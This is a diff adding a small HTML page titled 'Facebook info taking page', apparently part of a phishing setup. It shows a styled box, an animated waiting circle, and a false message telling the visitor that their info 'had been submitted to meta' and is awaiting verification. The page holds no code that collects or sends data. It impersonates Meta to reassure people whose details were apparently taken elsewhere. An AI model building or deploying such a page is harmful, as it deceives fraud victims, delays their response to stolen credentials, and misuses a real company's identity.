@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <style>
+        .info {
+            border: 2px solid black;
+            background-color: blue;
+        }
+
+        .waiting {
+            border-radius: 50%;
+            width: 150px;
+            height: 150px;
+            animation-duration: 3s;
+            animation-name: wait;
+            animation-iteration-count: infinite;
+            background-color: blue;
+            position: relative;
+        }
+
+        @keyframes wait {
+            0% {background-color: blue; left: 0px; top: 0px;}
+            25% {background-color: aqua; left: 200px; top: 0px;}
+            50% {background-color: darkblue; left: 200px; top: 200px;}
+            75% {background-color: darkcyan; left: 0px; top: 200px;}
+            100% {background-color: blue; left: 0px; top: 0px;}
+        }
+    </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title> Facebook info taking page</title>
+</head>
+<body>
+    <div class="info">
+    <h1> Your info had been submitted to meta but it might take some time for us to verify it </h1>
+</div>
+    <div class="waiting">
+
+    </div>
+</body>
+</html>
